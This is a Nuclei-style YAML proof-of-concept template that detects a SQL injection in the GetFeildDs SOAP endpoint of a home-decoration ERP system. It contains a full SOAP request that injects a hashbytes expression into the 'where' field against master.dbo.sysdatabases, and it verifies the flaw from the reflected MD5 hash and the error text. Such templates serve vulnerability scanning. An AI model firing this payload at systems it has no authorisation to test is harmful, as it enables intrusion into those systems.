folder-9/poc-yaml-znfit-erp-ms-getfeildds-sqli.yaml

id: poc-yaml-znfit-erp-ms-getfeildds-sqli

variables:
  t1: "{{rand_int(1000,10000)}}"
  t2: "{{md5(t1)}}"

info:
  name: 家装ERP管理系统 GetFeildDs SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    This template checks for SQL injection vulnerability in 家装ERP管理系统 GetFeildDs.

http:
  - raw:
      - |
        POST /WEB_SERVICE/Public.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        Soapaction: "http://tempuri.org/GetFeildDs"

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetFeildDs xmlns="http://tempuri.org/">
              <field>1</field>
              <tbName>master.dbo.sysdatabases</tbName>
              <where>1=sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))</where>
            </GetFeildDs>
          </soap:Body>
        </soap:Envelope>

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500

      - type: word
        words:
          - "服务器无法处理请求"
          - "转换成数据类型"
        part: body

      - type: regex
        regex:
          - "0x{{t2}}"
        part: body

      - type: word
        words:
          - "text/xml"
        part: header
